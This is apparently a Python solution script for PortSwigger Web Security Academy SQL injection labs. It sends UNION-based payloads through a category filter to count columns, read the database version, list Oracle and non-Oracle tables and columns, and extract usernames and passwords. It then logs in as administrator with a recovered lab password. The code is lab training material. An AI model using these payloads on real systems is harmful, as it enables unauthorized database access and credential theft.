# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

import requests
requests.packages.urllib3.disable_warnings()

base = "https://ac531f011fb0912c80e3504000d7009a.web-security-academy.net"
path = "/filter"
url = base + path

proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
cookies = {"session": "Need a valid session token here"}

def findNumberOfColumns():
    for i in range(1,11):
        q = f"' ORDER BY {i}-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

def queryingDatabaseVersionOracle():
    q = f"' UNION SELECT banner, NULL FROM v$version--"
    params = {"category": q}
    requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

def queryingDatabaseVersionMysqlMicrosoft():
    q = f"' UNION SELECT @@version, NULL-- "
    params = {"category": q}
    requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

def login():
    username = "administrator"
    csrf = "Need a valid CSRF token here"
    # password = "e63lyfhsxoyeakv1fytd" # NonOracle
    password = "plkdb9u3f39szz04u91z" # Oracle
    data = {"csrf": csrf, "username": username, "password": password}
    route = "/login"
    requests.post(url=base + route, data=data, cookies=cookies, proxies=proxies, verify=verify)

def listingDatabaseContentsNonOracle():
    def listAllTableNames():
        q = f"' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

    def listAllColumnNames():
        table = "users_jxoazw"
        q = f"' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = '{table}'-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

    def retrieveUserNameAndPassword():
        table = "users_jxoazw"
        col1 = "username_aftmdt"
        col2 = "password_scjpvq"
        q = f"' UNION SELECT {col1}, {col2} FROM {table}-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

    # listAllTableNames()
    # listAllColumnNames()
    retrieveUserNameAndPassword()

def listingDatabaseContentsOracle():
    table = "USERS_GCTTNX"

    def listAllTableNames():
        q = f"' UNION SELECT TABLE_NAME, NULL FROM all_tables-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

    def listAllColumnNames():
        q = f"' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = '{table}'-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

    def retrieveUserNameAndPassword():
        col1 = "USERNAME_KTGDCI"
        col2 = "PASSWORD_ENHVAM"
        q = f"' UNION SELECT {col1}, {col2} FROM {table}-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

    # listAllTableNames()
    # listAllColumnNames()
    retrieveUserNameAndPassword()


# findNumberOfColumns()
# queryingDatabaseVersionOracle()
# queryingDatabaseVersionMysqlMicrosoft()
# listingDatabaseContentsNonOracle()
# listingDatabaseContentsOracle()
login()
